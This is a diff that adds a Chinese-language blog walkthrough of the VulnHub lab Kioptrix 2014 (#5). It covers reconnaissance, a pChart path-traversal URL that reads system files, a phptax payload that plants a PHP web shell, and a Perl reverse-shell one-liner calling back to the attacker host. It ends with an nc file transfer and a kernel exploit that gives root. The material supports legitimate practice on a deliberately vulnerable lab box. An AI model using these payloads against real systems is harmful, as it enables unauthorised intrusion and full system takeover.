@@ -1823,4 +1823,95 @@
         <tag>vulnhub</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Kioptrix Level 5 Walkthrough</title>
+    <url>/2025/04/14/Kioptrix%20Level%205/</url>
+    <content><![CDATA[<h1 id="Kioptrix-Level-5-Walkthrough"><a href="#Kioptrix-Level-5-Walkthrough" class="headerlink" title="Kioptrix Level 5 Walkthrough"></a>Kioptrix Level 5 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a></p>
+<p><img src="/picture/image-20250414184141580.png" alt="image-20250414184141580"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>目标主机启动后需要输入 <code>ufs:/dev/ada0p2</code></p>
+<p><img src="/picture/image-20250414183715240.png" alt="image-20250414183715240"></p>
+<p>才算登陆成功</p>
+<p><img src="/picture/image-20250414183846610.png" alt="image-20250414183846610"></p>
+<p>确定存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414134614134.png" alt="image-20250414134614134"></p>
+<p>对目标 IP 进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.152</span><br></pre></td></tr></table></figure>
+
+<p>发现开放 80，8080 端口</p>
+<p><img src="/picture/image-20250414134537101.png" alt="image-20250414134537101"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80，8080 -A 192.168.186.152</span><br></pre></td></tr></table></figure>
+
+<p>80 和 8080 端口开放的服务版本是一样的，但是 8080 端口状态码是 403 Forbidden</p>
+<p><img src="/picture/image-20250414134749796.png" alt="image-20250414134749796"></p>
+<p>那先来看 80 端口，或许能从中找到为什么 8080 端口是 403 状态码</p>
+<p>进行目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.152</span><br></pre></td></tr></table></figure>
+
+<p>看起来没有发现什么有用的东西</p>
+<p><img src="/picture/image-20250414135036362.png" alt="image-20250414135036362"></p>
+<p>那就直接访问页面，在源码中发现新的目录 &#x2F;pChart2.1.3&#x2F;index.php</p>
+<p><img src="/picture/image-20250414135131213.png" alt="image-20250414135131213"></p>
+<p>访问一下看看，发现被重定向到 &#x2F;pChart2.1.3&#x2F;examples&#x2F;index.php ，看起来 &#x2F;pChart2.1.3 是网站真正的目录，同时也暴露了该架构的版本为 2.1.3 </p>
+<p><img src="/picture/image-20250414135234747.png" alt="image-20250414135234747"></p>
+<p>去搜索一下对应版本是否存在漏洞，在 <a href="https://www.exploit-db.com/exploits/31173">pChart 2.1.3 - Multiple Vulnerabilities - PHP webapps Exploit</a> 中可以发现存在路径遍历漏洞</p>
+<p><img src="/picture/image-20250414135622413.png" alt="image-20250414135622413"></p>
+<p>利用成功，回显 &#x2F;etc&#x2F;passwd ，同时泄露操作系统版本</p>
+<p><img src="/picture/image-20250414140103044.png" alt="image-20250414140103044"></p>
+<p>由于是 Apache 作为 WEB 服务器，那我们可以尝试使用默认路径读取 FreeBSD 的 Apache 配置文件</p>
+<p><img src="/picture/image-20250414140253529.png" alt="image-20250414140253529"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f../usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>包含成功，发现要访问 8080 需要特定的 User-Agent</p>
+<p><img src="/picture/image-20250414140356111.png" alt="image-20250414140356111"></p>
+<p>开启 burp 拦截，将 User-Agent 更改为 Mozilla&#x2F;4.0 ，发现 phptax 目录</p>
+<p><img src="/picture/image-20250414150134654.png" alt="image-20250414150134654"></p>
+<p>搜索 phptax 有关漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit phptax</span><br></pre></td></tr></table></figure>
+
+<p>发现三个有关 payload</p>
+<p><img src="/picture/image-20250414175813001.png" alt="image-20250414175813001"></p>
+<p>在 中能发现漏洞利用过程，先使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$url&#125;/index.php?field=rce.php&amp;newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机 &#x2F;tmp 目录创建 rce.php ，之后使用 cmd 参数命令执行</p>
+<p><img src="/picture/image-20250414175930362.png" alt="image-20250414175930362"></p>
+<p>利用成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152:8080/phptax/data/rce.php?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414183044909.png" alt="image-20250414183044909"></p>
+<p>尝试反弹 shell </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152:8080/phptax/data/rce.php?cmd=perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.186.141:8023&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功获得回弹的 shell</p>
+<p><img src="/picture/image-20250414180217399.png" alt="image-20250414180217399"></p>
+<p>由于目标主机不包含 python ，不能升级 TTY shell</p>
+<p>查看内核版本发现是 FreeBSD 9.0 ，存在内核提权漏洞</p>
+<p><img src="/picture/image-20250414180438132.png" alt="image-20250414180438132"></p>
+<p>将 exp 下载至本机，由于目标主机没有 wget 命令，但是有 nc 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which nc</span><br><span class="line">/usr/bin/nc</span><br></pre></td></tr></table></figure>
+
+<p> 使用 nc 传输文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 本机</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nvlp 8888 &lt; 28718.c  </span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [192.168.186.141] from (UNKNOWN) [192.168.186.152] 41152</span><br><span class="line"></span><br><span class="line"># 目标主机</span><br><span class="line">nc -nv 192.168.186.141 8888 &gt; 28718.c</span><br><span class="line"></span><br><span class="line">ls -la</span><br><span class="line">total 128</span><br><span class="line">drwxrwxrwx   9 www  wheel    512 Apr 14 06:10 .</span><br><span class="line">drwxrwxrwx   8 www  wheel    512 Mar 28  2014 ..</span><br><span class="line">drwxrwxrwx  12 www  wheel    512 May  7  2003 1040</span><br><span class="line">-rw-r--r--   1 www  wheel   5563 Apr 14 06:09 28718.c</span><br><span class="line">drwxrwxrwx   2 www  wheel    512 May  7  2003 SchA</span><br><span class="line">drwxrwxrwx   2 www  wheel    512 May  7  2003 SchB</span><br><span class="line">drwxrwxrwx   6 www  wheel    512 May  7  2003 SchD</span><br><span class="line">drwxrwxrwx   4 www  wheel    512 May  7  2003 SchD1</span><br><span class="line">drwxrwxrwx   7 www  wheel    512 May  7  2003 W2</span><br><span class="line">drwxrwxrwx   2 www  wheel   1536 Mar 26  2014 pdf</span><br><span class="line">-rw-r--r--   1 www  wheel     29 Apr 14 05:34 rce.php</span><br><span class="line">-rw-r--r--   1 www  wheel     29 Apr 14 05:45 shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414182258978.png" alt="image-20250414182258978"></p>
+<p>使用目标主机自带 gcc 编译并赋予可执行权限，执行获得 root 权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc gcc 28718.c -o exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414181411716.png" alt="image-20250414181411716"></p>
+<p>获得 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -la /root</span><br><span class="line">cat /root/congrats.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414181815671.png" alt="image-20250414181815671"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
 </search>
